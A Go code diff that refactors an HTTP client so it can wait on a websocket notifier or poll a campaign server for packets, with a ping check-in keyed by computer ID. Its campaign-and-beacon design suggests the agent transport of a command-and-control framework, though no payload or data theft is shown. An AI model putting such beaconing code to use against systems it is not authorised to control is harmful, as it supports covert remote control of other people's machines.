@@ -19,10 +19,13 @@ type UpstreamHttp struct {
 
 	config   *ClientConfig
 	campaign *model.Campaign
+
+	notifier WebsocketNotifier
 }
 
-func MakeUpstream(config *ClientConfig, campaign *model.Campaign) UpstreamHttp {
+func MakeUpstreamHttp(config *ClientConfig, campaign *model.Campaign) UpstreamHttp {
 	coder := model.MakeCoder(campaign)
+	notifier := MakeWebsocketNotifier(config, campaign)
 
 	u := UpstreamHttp{
 		make(chan model.Packet),
@@ -30,30 +33,62 @@ func MakeUpstream(config *ClientConfig, campaign *model.Campaign) UpstreamHttp {
 		coder,
 		config,
 		campaign,
+		notifier,
 	}
 	return u
 }
 
-func (d UpstreamHttp) Channel() chan model.Packet {
+func (d *UpstreamHttp) Connect() error {
+	if d.campaign.ClientUseWebsocket {
+		log.Info("UpstreamHttp: Use WS")
+		err := d.notifier.Connect()
+		if err != nil {
+			log.Warnf("Could not connect websocket to %s", d.campaign.ServerUrl)
+		}
+	}
+
+	arguments := make(model.PacketArgument)
+	response := make(model.PacketResponse)
+	packet := model.NewPacket("ping", d.config.ComputerId, "0", arguments, response)
+	err := d.SendOutofband(packet)
+	if err != nil {
+		log.Warnf("Could not reach server atm %s", d.campaign.ServerUrl)
+	}
+
+	return nil
+}
+
+func (d *UpstreamHttp) Channel() chan model.Packet {
 	return d.channel
 }
 
-func (d UpstreamHttp) SendPacket(packet model.Packet) error {
+func (d *UpstreamHttp) SendOutofband(packet model.Packet) error {
 	// Only used for client-initiated packets
 	return d.sendPacket(packet)
 }
 
 // Start is a Thread responsible for receiving packets from server, lifetime:app
-func (d UpstreamHttp) Start() {
+func (d *UpstreamHttp) Start() {
 	for {
-		// Sleep first
-		time.Sleep(d.state.getSleepDuration())
+		// If the websocket is connected, it will notify us of new packets (it blocks).
+		// If not, try regularly
+		if d.campaign.ClientUseWebsocket && d.notifier.IsConnected() {
+			log.Info("-> Waiting")
+			<-d.notifier.channel
+			log.Info("-> Finished waiting")
+		} else {
+			time.Sleep(d.state.getSleepDuration())
+		}
 
 		// Try getting a packet from server
 		packet, err := d.GetPacket()
 		if err != nil {
 			if err == ErrNoPacketsFound {
 				fmt.Print(".")
+
+				if d.campaign.ClientUseWebsocket && d.notifier.IsConnected() {
+					log.Error("WS notified us about new packet, but there wasnt one")
+				}
 				continue // no packets for us, maybe later
 			}
 
@@ -85,7 +120,7 @@ func (d UpstreamHttp) Start() {
 	}
 }
 
-func (d UpstreamHttp) GetPacket() (model.Packet, error) {
+func (d *UpstreamHttp) GetPacket() (model.Packet, error) {
 	url := d.PacketGetUrl()
 	resp, err := d.HttpGet(url)
 	if err != nil {
@@ -110,7 +145,7 @@ func (d UpstreamHttp) GetPacket() (model.Packet, error) {
 	return packet, nil
 }
 
-func (d UpstreamHttp) sendPacket(packet model.Packet) error {
+func (d *UpstreamHttp) sendPacket(packet model.Packet) error {
 	url := d.PacketSendUrl()
 
 	// Setup response
